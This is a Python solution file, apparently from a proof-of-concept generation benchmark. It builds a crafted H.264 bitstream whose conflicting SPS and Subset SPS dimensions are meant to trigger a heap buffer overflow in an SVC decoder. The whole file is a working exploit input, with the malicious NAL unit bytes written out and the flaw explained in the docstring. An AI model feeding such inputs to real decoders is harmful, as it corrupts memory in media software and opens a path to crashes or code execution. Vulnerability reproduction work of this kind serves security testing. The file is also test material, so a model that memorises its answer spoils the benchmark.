class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) that triggers a heap buffer overflow
        in the svcdec decoder.

        The vulnerability occurs when the decoder display dimensions, derived from a
        regular Sequence Parameter Set (SPS), do not match the dimensions
        specified in a Subset SPS for Scalable Video Coding (SVC).

        This PoC constructs a minimal H.264 Annex B bitstream containing four
        Network Abstraction Layer (NAL) units:
        1.  A Subset SPS (NALU Type 15): This NALU is crafted from a valid SPS
            for a large resolution (e.g., 1920x1080). Its type is changed from
            SPS (7) to Subset SPS (15), and its profile is set to an SVC-
            compatible one (Scalable High Profile, 86). This sets up the large
            dimensions that will be used erroneously.
        2.  A regular SPS (NALU Type 7): This is a valid SPS for a very small
            resolution (16x16). It shares the same ID (0) as the Subset SPS.
            The decoder is expected to use this SPS for memory allocation,
            resulting in a small buffer.
        3.  A Picture Parameter Set (PPS): This refers to the small SPS (ID 0).
        4.  An IDR Slice: This triggers the decoding process, where the decoder
            is expected to use the large dimensions from the Subset SPS to write
            pixel data into the small buffer allocated based on the regular SPS,
            causing a heap buffer overflow.

        Args:
            src_path: Path to the vulnerable source code tarball (unused in this solution).

        Returns:
            bytes: The PoC input as a raw H.264 bitstream.
        """
        # H.264 Annex B start code prefix for each NAL unit.
        start_code = b'\x00\x00\x00\x01'

        # NALU 1: A malicious Subset SPS (type 15) advertising large dimensions.
        # This is derived from a valid 1920x1080 SPS. The NALU type byte is
        # changed from 0x67 to 0x6F, and the profile_idc from 100 (0x64) to 86 (0x56).
        subset_sps = b'\x6f\x56\x00\x28\xac\x2b\x40\x28\x02\xdd\x00\xf0\x88\x46\xa0'

        # NALU 2: A regular SPS (type 7) for a small 16x16 resolution.
        # This uses the same seq_parameter_set_id (0) to create a conflict.
        # Buffers are expected to be allocated based on this small size.
        sps = b'\x67\x64\x00\x0a\xac\x72\x84\x44\x26\x84\x00\x00\x03\x00\x04\x00\x00\x03\x00\xf0\x3c\x58\xb6\x58'

        # NALU 3: A PPS that references the small SPS (ID 0).
        pps = b'\x68\xe9\x23\x52'

        # NALU 4: An IDR slice that initiates the picture decoding process,
        # triggering the vulnerability.
        slice_idr = b'\x65\x88\x84\x21\xa6\x59\x74\x7c\x35\x24\x94\x43\x8f\x8b\x21\xb0\x98\x62\x8d\x79\x38\x78\x8b\x18\xe0\xdc\x3b\xc0\x7a\x3e\x47\x86\x28\x22\x93\x42\x09\xd8\x8a\x19\x64\xa1\x04'

        # Assemble the final PoC bitstream.
        poc = (
            start_code + subset_sps +
            start_code + sps +
            start_code + pps +
            start_code + slice_idr
        )

        return poc
